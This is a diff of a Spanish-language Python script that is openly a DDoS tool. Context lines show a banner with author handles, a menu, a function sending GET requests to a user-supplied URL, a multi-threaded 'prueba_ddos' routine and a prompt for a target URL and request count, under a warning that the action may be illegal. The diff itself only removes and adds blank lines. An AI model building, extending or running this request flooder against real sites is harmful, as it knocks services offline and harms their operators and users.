@@ -1,6 +1,4 @@
-
 #!/usr/bin/env python3
-
 
 import os
 import requests
@@ -26,7 +24,6 @@ o888bood8P'   o888bood8P'    `Y8bood8P'  8""88888P'
     print(ROJO + "              (Jesús803576) (thefsg369)" + RESET)
 
 def mostrar_menu():
-
     mostrar_banner()
     print()  
     print(VERDE + "=== Menú Principal ===" + RESET)
@@ -34,14 +31,12 @@ def mostrar_menu():
     print(VERDE + "2. Salir" + RESET)
     print(VERDE + "=" * 20 + RESET)  
 
-
 def enviar_solicitud(url):
     try:
         respuesta = requests.get(url, timeout=5)
         print(f"Respuesta {respuesta.status_code}")
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
-
 
 def prueba_ddos(url, num_solicitudes, hilos):
     lista_hilos = []
@@ -64,6 +59,10 @@ def prueba_ddos(url, num_solicitudes, hilos):
 
 def opcion_ddos():
     mostrar_banner()
+
+    
+    print() 
+
     print(ROJO + "ADVERTENCIA: Esta acción podría ser ilegal y tiene consecuencias serias." + RESET)
     url = input(VERDE + "Ingresa la URL objetivo: " + RESET) 
     num_solicitudes = int(input(VERDE + "Número de solicitudes: " + RESET))  
